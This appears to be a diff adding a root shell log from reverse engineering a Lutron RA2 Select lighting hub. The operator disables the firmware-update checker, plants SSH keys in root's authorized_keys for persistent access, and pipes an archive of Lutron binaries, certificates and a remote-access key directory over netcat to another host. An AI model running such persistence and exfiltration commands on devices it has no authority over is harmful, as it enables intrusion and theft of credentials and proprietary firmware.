@@ -14,3 +14,370 @@ Built-in commands:
 	type ulimit umask unalias unset wait
 
 # 
+# kill $(pidof checkForFWUpgradeSource.sh) 
+sh: you need to specify whom to kill
+# pidof checkForFWUpgradeSource.sh
+# ps
+  PID USER       VSZ STAT COMMAND
+    1 root      2240 S    init
+    2 root         0 SW   [kthreadd]
+    3 root         0 SW   [ksoftirqd/0]
+    5 root         0 SW<  [kworker/0:0H]
+    6 root         0 SW   [kworker/u2:0]
+    7 root         0 SW<  [khelper]
+    8 root         0 SW   [kworker/u2:1]
+   38 root         0 SW   [kworker/0:1]
+  205 root         0 SW<  [writeback]
+  207 root         0 SW<  [bioset]
+  209 root         0 SW<  [kblockd]
+  286 root         0 SW   [khubd]
+  386 root         0 SW<  [rpciod]
+  390 root         0 SW   [kworker/0:2]
+  401 root         0 SW   [kswapd0]
+  402 root         0 SW   [fsnotify_mark]
+  403 root         0 SW<  [nfsiod]
+  435 root         0 SW<  [OMAP UART0]
+  437 root         0 SW<  [OMAP UART1]
+  439 root         0 SW<  [OMAP UART3]
+  531 root         0 SW   [spi1]
+  606 root         0 SW<  [deferwq]
+  607 root         0 SW   [irq/87-4802a000]
+  620 root         0 SW   [ubi_bgt0d]
+  634 root         0 SW   [ubifs_bgt0_0]
+  646 root      1728 S    /usr/sbin/watchdog
+  649 root      1668 S    rngd
+  657 root         0 SW   [ubifs_bgt0_4]
+  659 root         0 SW   [ubifs_bgt0_2]
+  661 root         0 SW   [ubifs_bgt0_5]
+  704 root     29964 S    rsyslogd -c5 -i /var/run/rsyslogd.pid
+  712 root     21760 S    /usr/sbin/lutron-eeprom-engine
+  965 root     38280 S    /usr/sbin/lutron-button-engine
+  969 root     21892 S    /usr/sbin/lutron-led-ui
+  975 nobody    2496 S    /usr/sbin/mdnsd
+  981 root      2916 S    crond
+  992 root      772m S    /usr/sbin/internet-connectivity-monitor.gobin /etc/l
+  993 root      2240 S    {updateLutronDns} /bin/sh -eu /usr/sbin/updateLutron
+ 1059 root      2848 S    /usr/sbin/xinetd -stayalive -pidfile /var/run/xinetd
+ 1098 root      1772 S    /usr/bin/dns-sd -R Lutron Status _lutron._tcp. local
+ 1140 root      110m S    /usr/sbin/lutron-core
+ 1142 root      847m S    /usr/sbin/leap-server.gobin -config=/etc/lutron.d/lu
+ 1143 root      2572 S    logger -t [[MULTI_SERVER_CRASH_LOG_7462]]
+ 1195 root      1684 S    /usr/sbin/c4-sddp-server -c /tmp/sddpd.conf
+ 1213 root      2240 S    {checkForFWUpgra} /bin/sh -eu /usr/sbin/checkForFWUp
+ 1301 root      4264 S    /usr/sbin/sshd
+ 1309 root      2244 S    -/bin/sh
+ 1312 root      5476 S    /usr/bin/monit -Ic /etc/monitrc
+ 1499 root      1772 S    /usr/bin/dns-sd -R RA2 Select Main Repeater _hap._tc
+ 7046 root      1728 S    /usr/sbin/watchdog
+17303 root      2572 R    ps
+25685 root     11920 S    /usr/sbin/chronyd -f /etc/chrony/chrony.conf
+32673 root      1860 S    dhcpcd -q -m 0 -t 0 eth0
+# ifconfig eth0 169.254.1.1 netmask 255.255.0.0 up
+# kill 32673                             
+#   kill 1213                                                       
+  monit stop all  #   monit stop all                                 
+upMonit: the monit HTTP interface is not enabled, please add the 'set httpd' statement and use the 'allow' option to allow monit to connect
+#   ifconfig eth0 169.254.1.1 netmask 255.255.0.0 up
+# clear
+[H[J# ps aux
+ps: invalid option -- 'a'
+BusyBox v1.20.2 (2017-08-30 16:35:13 EDT) multi-call binary.
+
+Usage: ps 
+
+# ps
+  PID USER       VSZ STAT COMMAND
+    1 root      2240 S    init
+    2 root         0 SW   [kthreadd]
+    3 root         0 SW   [ksoftirqd/0]
+    5 root         0 SW<  [kworker/0:0H]
+    6 root         0 SW   [kworker/u2:0]
+    7 root         0 SW<  [khelper]
+    8 root         0 SW   [kworker/u2:1]
+   38 root         0 SW   [kworker/0:1]
+  205 root         0 SW<  [writeback]
+  207 root         0 SW<  [bioset]
+  209 root         0 SW<  [kblockd]
+  286 root         0 SW   [khubd]
+  386 root         0 SW<  [rpciod]
+  390 root         0 SW   [kworker/0:2]
+  401 root         0 SW   [kswapd0]
+  402 root         0 SW   [fsnotify_mark]
+  403 root         0 SW<  [nfsiod]
+  435 root         0 SW<  [OMAP UART0]
+  437 root         0 SW<  [OMAP UART1]
+  439 root         0 SW<  [OMAP UART3]
+  531 root         0 SW   [spi1]
+  606 root         0 SW<  [deferwq]
+  607 root         0 SW   [irq/87-4802a000]
+  620 root         0 SW   [ubi_bgt0d]
+  634 root         0 SW   [ubifs_bgt0_0]
+  646 root      1728 S    /usr/sbin/watchdog
+  649 root      1668 S    rngd
+  657 root         0 SW   [ubifs_bgt0_4]
+  659 root         0 SW   [ubifs_bgt0_2]
+  661 root         0 SW   [ubifs_bgt0_5]
+  704 root     29964 S    rsyslogd -c5 -i /var/run/rsyslogd.pid
+  712 root     21760 S    /usr/sbin/lutron-eeprom-engine
+  965 root     38280 S    /usr/sbin/lutron-button-engine
+  969 root     21892 S    /usr/sbin/lutron-led-ui
+  975 nobody    2500 S    /usr/sbin/mdnsd
+  981 root      2916 S    crond
+  992 root      772m S    /usr/sbin/internet-connectivity-monitor.gobin /etc/l
+  993 root      2240 S    {updateLutronDns} /bin/sh -eu /usr/sbin/updateLutron
+ 1059 root      2848 S    /usr/sbin/xinetd -stayalive -pidfile /var/run/xinetd
+ 1098 root      1772 S    /usr/bin/dns-sd -R Lutron Status _lutron._tcp. local
+ 1140 root      110m S    /usr/sbin/lutron-core
+ 1142 root      847m S    /usr/sbin/leap-server.gobin -config=/etc/lutron.d/lu
+ 1143 root      2572 S    logger -t [[MULTI_SERVER_CRASH_LOG_7462]]
+ 1195 root      1684 S    /usr/sbin/c4-sddp-server -c /tmp/sddpd.conf
+ 1301 root      4264 S    /usr/sbin/sshd
+ 1309 root      2244 S    -/bin/sh
+ 1312 root      5476 S    /usr/bin/monit -Ic /etc/monitrc
+ 1499 root      1772 S    /usr/bin/dns-sd -R RA2 Select Main Repeater _hap._tc
+ 2810 root      2572 R    ps
+ 7046 root      1728 S    /usr/sbin/watchdog
+25685 root     11920 S    /usr/sbin/chronyd -f /etc/chrony/chrony.conf
+# clear
+[H[J# mkdir -p /root/.ssh
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAZCsYUnzY00yXfRQelTdOXQZOePVvo3YlPUl# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAZCsYUnzY00yXfRQelTdOXQZOePVvo3YlPU
+l95DKkJs GitLab" > /root/.ssh/authorized_keys
+chmod 700 # chmod 700 /root/.ssh
+chmod 600 /root/.ssh/authorized_keys# chmod 600 /root/.ssh/authorized_keys
+# cat /etc/ssh/sshd_config | grep -i auth
+cat /root/.ssh/authorized_keys
+ls -la /root/.ssh/cat: can't open '/etc/ssh/sshd_config': No such file or directory
+# cat /root/.ssh/authorized_keys
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAZCsYUnzY00yXfRQelTdOXQZOePVvo3YlPUl95DKkJs GitLab
+# ls -la /root/.ssh/
+drwx------    2 root     root           232 Aug 30 17:11 .
+drwxr-x---    4 root     root           368 Aug 30 17:11 ..
+-rw-------    1 root     root            88 Aug 30 17:11 authorized_keys
+# tar czf - /var/db/ /usr/sbin/lutron-core /usr/sbin/leap-server.gobin /usr/sbin
+/lutron-coproc-firmware-update-app /usr/sbin/lutron-button-engine /usr/sbin/lutr
+on-eeprom-engine /usr/sbin/lutron-led-ui /usr/sbin/lutron-integration /usr/sbin/
+lutron-core-client /usr/sbin/lutron-eol /usr/sbin/c4-sddp-server /etc/lutron.d/ 
+/etc/ssl/ /usr/share/lap-certs/ /root/.Remoteaccesskey/ /var/misc/auth/ /etc/ini
+t.d/ /etc/monitrc 2>/dev/null | nc 169.254.1.2 9999
+nc: can't connect to remote host (169.254.1.2): Connection refused
+# # tar czf - /var/db/ /usr/sbin/lutron-core /usr/sbin/leap-server.gobin /usr/sbin
+/lutron-coproc-firmware-update-app /usr/sbin/lutron-button-engine /usr/sbin/lutr
+on-eeprom-engine /usr/sbin/lutron-led-ui /usr/sbin/lutron-integration /usr/sbin/
+lutron-core-client /usr/sbin/lutron-eol /usr/sbin/c4-sddp-server /etc/lutron.d/ 
+/etc/ssl/ /usr/share/lap-certs/ /root/.Remoteaccesskey/ /var/misc/auth/ /etc/ini
+t.d/ /etc/monitrc 2>/dev/null | nc 169.254.1.2 9999[J
+# tar czf - /var/db/ /usr/sbin/lutron-core /usr/sbin/leap-server.gobin /usr/sbin
+/lutron-coproc-firmware-update-app /usr/sbin/lutron-button-engine /usr/sbin/lutr
+on-eeprom-engine /usr/sbin/lutron-led-ui /usr/sbin/lutron-integration /usr/sbin/
+lutron-core-client /usr/sbin/lutron-eol /usr/sbin/c4-sddp-server /etc/lutron.d/ 
+/etc/ssl/ /usr/share/lap-certs/ /root/.Remoteaccesskey/ /var/misc/auth/ /etc/ini
+t.d/ /etc/monitrc 2>/dev/null | nc -l -p 9999
+BusyBox v1.20.2 (2017-08-30 16:35:13 EDT) multi-call binary.
+
+Usage: nc [IPADDR PORT]
+
+# busybox httpd -f -p 9999 -h /
+httpd: applet not found
+# 
+# ssh
+usage: ssh [-1246AaCfgKkMNnqsTtVvXxYy] [-b bind_address] [-c cipher_spec]
+           [-D [bind_address:]port] [-E log_file] [-e escape_char]
+           [-F configfile] [-I pkcs11] [-i identity_file]
+           [-L [bind_address:]port:host:hostport] [-Q protocol_feature]
+           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]
+           [-R [bind_address:]port:host:hostport] [-S ctl_path]
+           [-W host:port] [-w local_tun[:remote_tun]]
+           [user@]hostname [command]
+# clear
+[H[J# find / -name sshd_config 2>/dev/null
+/usr/sbin/sshd -h 2>&1 | head -5
+cat /etc/default/sshd 2>/dev/null/etc/openssh/sshd_config
+
+# /usr/sbin/sshd -h 2>&1 | head -5
+option requires an argument -- h
+OpenSSH_6.4p1, OpenSSL 1.0.1g 7 Apr 2014
+usage: sshd [-46DdeiqTt] [-b bits] [-C connection_spec] [-c host_cert_file]
+            [-E log_file] [-f config_file] [-g login_grace_time]
+            [-h host_key_file] [-k key_gen_time] [-o option] [-p port]
+# cat /etc/default/sshd 2>/dev/null
+# 
+# ls -la /usr/sbin/sshd
+-rwxr-xr-x    1 root     root        409284 Aug 30 16:48 /usr/sbin/sshd
+# file /usr/sbin/sshd 2>/dev/null || strings /usr/sbin/sshd | grep -i -E "dropbe
+ar|openssh" | head -5
+OpenSSH_6.4p1
+OpenSSH_6.4
+none,zlib@openssh.com
+/etc/openssh/sshd_config
+ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-rsa-cert-v01@openssh.com,ssh-dss-cert-v01@openssh.com,ssh-rsa-cert-v00@openssh.com,ssh-dss-cert-v00@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-rsa,ssh-dss
+#  cat /etc/openssh/sshd_config
+#	$OpenBSD: sshd_config,v 1.90 2013/05/16 04:09:14 dtucker Exp $
+
+# This is the sshd server system-wide configuration file.  See
+# sshd_config(5) for more information.
+
+# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin
+
+# The strategy used for options in the default sshd_config shipped with
+# OpenSSH is to specify options with their default value where
+# possible, but leave them commented.  Uncommented options override the
+# default value.
+
+#Port 22
+#AddressFamily any
+#ListenAddress 0.0.0.0
+#ListenAddress ::
+
+# The default requires explicit activation of protocol 1
+#Protocol 2
+
+# HostKey for protocol version 1
+#HostKey /etc/openssh/ssh_host_key
+# HostKeys for protocol version 2
+#HostKey /etc/openssh/ssh_host_rsa_key
+#HostKey /etc/openssh/ssh_host_dsa_key
+#HostKey /etc/openssh/ssh_host_ecdsa_key
+
+# Lifetime and size of ephemeral version 1 server key
+#KeyRegenerationInterval 1h
+#ServerKeyBits 1024
+
+# Ciphers and keying
+#RekeyLimit default none
+
+# Logging
+# obsoletes QuietMode and FascistLogging
+#SyslogFacility AUTH
+#LogLevel INFO
+
+# Authentication:
+
+#LoginGraceTime 2m
+#PermitRootLogin yes
+#StrictModes yes
+#MaxAuthTries 6
+#MaxSessions 10
+
+#RSAAuthentication yes
+#PubkeyAuthentication yes
+
+# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
+# but this is overridden so installations will only check .ssh/authorized_keys
+AuthorizedKeysFile	.ssh/authorized_keys
+
+#AuthorizedPrincipalsFile none
+
+#AuthorizedKeysCommand none
+#AuthorizedKeysCommandUser nobody
+
+# For this to work you will also need host keys in /etc/openssh/ssh_known_hosts
+#RhostsRSAAuthentication no
+# similar for protocol version 2
+#HostbasedAuthentication no
+# Change to yes if you don't trust ~/.ssh/known_hosts for
+# RhostsRSAAuthentication and HostbasedAuthentication
+#IgnoreUserKnownHosts no
+# Don't read the user's ~/.rhosts and ~/.shosts files
+#IgnoreRhosts yes
+
+# To disable tunneled clear text passwords, change to no here!
+PasswordAuthentication no
+#PermitEmptyPasswords no
+
+AllowUsers root support leap
+
+# Change to no to disable s/key passwords
+#ChallengeResponseAuthentication yes
+
+# Kerberos options
+#KerberosAuthentication no
+#KerberosOrLocalPasswd yes
+#KerberosTicketCleanup yes
+#KerberosGetAFSToken no
+
+# GSSAPI options
+#GSSAPIAuthentication no
+#GSSAPICleanupCredentials yes
+
+# Set this to 'yes' to enable PAM authentication, account processing, 
+# and session processing. If this is enabled, PAM authentication will 
+# be allowed through the ChallengeResponseAuthentication and
+# PasswordAuthentication.  Depending on your PAM configuration,
+# PAM authentication via ChallengeResponseAuthentication may bypass
+# the setting of "PermitRootLogin without-password".
+# If you just want the PAM account and session checks to run without
+# PAM authentication, then enable this but set PasswordAuthentication
+# and ChallengeResponseAuthentication to 'no'.
+#UsePAM no
+
+#AllowAgentForwarding yes
+#AllowTcpForwarding yes
+#GatewayPorts no
+#X11Forwarding no
+#X11DisplayOffset 10
+#X11UseLocalhost yes
+#PrintMotd yes
+#PrintLastLog yes
+#TCPKeepAlive yes
+#UseLogin no
+UsePrivilegeSeparation sandbox		# Default for new installations.
+#PermitUserEnvironment no
+#Compression delayed
+#ClientAliveInterval 0
+#ClientAliveCountMax 3
+UseDNS no
+#PidFile /var/run/sshd.pid
+#MaxStartups 10:30:100
+#PermitTunnel no
+#ChrootDirectory none
+#VersionAddendum none
+
+# no default banner path
+#Banner none
+
+# override default of no subsystems
+#Subsystem	sftp	/usr/lib/sftp-server
+Subsystem	sftp	internal-sftp
+Match User support
+   ChrootDirectory /var/sftp/support/tmp
+   ForceCommand internal-sftp
+   AllowTcpForwarding no
+   X11Forwarding no
+
+# Overriding settings for "leap" user
+Match User leap
+	X11Forwarding no
+	AllowTcpForwarding yes
+
+# Example of overriding settings on a per-user basis
+#Match User anoncvs
+#	X11Forwarding no
+#	AllowTcpForwarding no
+#	ForceCommand cvs server
+# #  cat /etc/openssh/sshd_config[J# [J
+# clear
+[H[J# grep -i -E "root|auth|keys" /etc/openssh/sshd_config | grep -v "^#"
+AuthorizedKeysFile	.ssh/authorized_keys
+PasswordAuthentication no
+AllowUsers root support leap
+   ChrootDirectory /var/sftp/support/tmp
+# grep ^root /etc/passwd
+root::0:0::/root:/bin/sh
+#  ssh-keygen -t ed25519 -f /dev/null 2>&1 | head -2
+unknown key type ed25519
+# 
+# clear
+[H[J# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDu3quqcliJ9Pa1sswDmmEpvQrAhTLJUEjW
+2TUc89Yyfaubxy8T4KAXIi1rrASlFAc05om+UbN75u7oUU6qIiF95C3dQtvxsvDIgjiSruEUoPZjXwDo
+iuoR++LIb1Xhn15TYU1Wuwl+6BYYosRlS92RFGeJgI679jXZHe1qyDf0Eb6z5HiZs3s3RQVGY9QxlFV4
+nc0V7kIVJ+ZWoejVWHEmywHx1V9OCouqryTi6V10AcPpRUZ4n5b52vb0RuavCuovYdTxJiWgLZkY4Z+q
+j8jvM+m6TXXwpnnZb0TlzQibk/vlFpqMTSWSaFtqR28IoSBdDxRlEVM9h0tWUCUL3cbv lutron-re" 
+> /root/.ssh/authorized_keys
+# xxd
+-/bin/sh: xxd: not found
+# cp
+BusyBox v1.20.2 (2017-08-30 16:35:13 EDT) multi-call binary.
+
+Usage: cp [OPTIONS] SOURCE... DEST
+
+# 
